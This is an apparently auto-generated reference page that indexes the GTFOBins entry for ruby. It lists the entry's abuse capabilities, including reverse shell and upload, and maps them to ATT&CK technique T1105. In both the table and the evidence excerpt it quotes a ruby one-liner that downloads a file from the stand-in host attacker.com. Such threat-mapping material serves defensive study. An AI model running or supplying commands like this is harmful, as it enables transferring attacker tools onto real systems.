---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ruby

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ruby` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ruby covering download, file-read, file-write, library-load, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ruby.md)
- Source verification: [source record](../../sources/gtfobins/ruby.md)

## Aliases

- `ruby`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")' |

## Source Verification

[source record](../../sources/gtfobins/ruby.md)

## Evidence Excerpt

```text
_body: ''
_name: ruby
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby
functions:
download:
- code: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download,
"/path/to/output-file")'
contexts:
```
